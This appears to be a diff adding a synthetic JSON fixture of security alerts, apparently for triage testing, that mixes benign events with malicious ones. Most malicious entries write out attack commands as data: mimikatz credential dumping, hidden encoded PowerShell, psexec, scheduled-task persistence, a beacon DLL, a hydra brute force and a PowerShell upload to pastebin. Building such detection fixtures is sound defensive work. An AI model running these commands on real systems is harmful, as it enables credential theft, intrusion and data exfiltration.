@@ -1,0 +1,102 @@
+[
+  {
+    "id": "ALERT-001",
+    "timestamp": "2026-07-14T09:12:03Z",
+    "source": "EDR",
+    "host": "WKSTN-014",
+    "user": "alice",
+    "process_name": "notepad.exe",
+    "command_line": "notepad.exe C:\\Users\\alice\\notes\\report.txt",
+    "description": "User opened a local text file during business hours."
+  },
+  {
+    "id": "ALERT-002",
+    "timestamp": "2026-07-14T02:47:11Z",
+    "source": "EDR",
+    "host": "SRV-DC01",
+    "user": "svc_backup",
+    "process_name": "mimikatz.exe",
+    "command_line": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+    "description": "Unsigned binary executed on a domain controller from a temp directory."
+  },
+  {
+    "id": "ALERT-003",
+    "timestamp": "2026-07-14T03:05:44Z",
+    "source": "EDR",
+    "host": "WKSTN-027",
+    "user": "bob",
+    "process_name": "powershell.exe",
+    "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+    "description": "PowerShell launched with an encoded command shortly after a phishing email was opened."
+  },
+  {
+    "id": "ALERT-004",
+    "timestamp": "2026-07-13T22:15:09Z",
+    "source": "Network",
+    "host": "WKSTN-005",
+    "user": "carol",
+    "process_name": "nmap",
+    "command_line": "nmap -sS -p- 10.0.0.0/24",
+    "description": "Internal host performing a full TCP port sweep of the corporate subnet."
+  },
+  {
+    "id": "ALERT-005",
+    "timestamp": "2026-07-14T01:30:52Z",
+    "source": "EDR",
+    "host": "SRV-FILE02",
+    "user": "administrator",
+    "process_name": "psexec.exe",
+    "command_line": "psexec.exe \\\\10.0.0.15 -u admin -p ******** cmd.exe",
+    "description": "Remote command execution against a file server from an unusual source host."
+  },
+  {
+    "id": "ALERT-006",
+    "timestamp": "2026-07-13T18:02:37Z",
+    "source": "EDR",
+    "host": "SRV-APP01",
+    "user": "svc_app",
+    "process_name": "schtasks.exe",
+    "command_line": "schtasks /create /tn WindowsUpdaterSvc /tr C:\\Windows\\Temp\\svc.exe /sc onlogon",
+    "description": "New scheduled task created to run a binary from a temp directory at every logon."
+  },
+  {
+    "id": "ALERT-007",
+    "timestamp": "2026-07-14T10:05:00Z",
+    "source": "EDR",
+    "host": "WKSTN-014",
+    "user": "alice",
+    "process_name": "explorer.exe",
+    "command_line": "explorer.exe",
+    "description": "Routine desktop shell process, no anomalies observed."
+  },
+  {
+    "id": "ALERT-008",
+    "timestamp": "2026-07-14T04:12:19Z",
+    "source": "Network",
+    "host": "SRV-WEB01",
+    "user": "svc_web",
+    "process_name": "rundll32.exe",
+    "command_line": "rundll32.exe C:\\Windows\\Temp\\beacon.dll,StartW",
+    "description": "Host beaconing to an unregistered external IP address every 60 seconds since last night."
+  },
+  {
+    "id": "ALERT-009",
+    "timestamp": "2026-07-13T20:44:56Z",
+    "source": "Network",
+    "host": "WKSTN-041",
+    "user": "unknown",
+    "process_name": "hydra",
+    "command_line": "hydra -l admin -P rockyou.txt ssh://10.0.0.5",
+    "description": "Repeated failed SSH login attempts from an internal workstation against a server."
+  },
+  {
+    "id": "ALERT-010",
+    "timestamp": "2026-07-14T05:55:23Z",
+    "source": "EDR",
+    "host": "WKSTN-019",
+    "user": "dave",
+    "process_name": "powershell.exe",
+    "command_line": "powershell.exe Invoke-WebRequest -Uri https://pastebin.com/raw/xyz123 -Method POST -Body $data",
+    "description": "PowerShell uploading local data to an external paste site shortly after a large file access."
+  }
+]
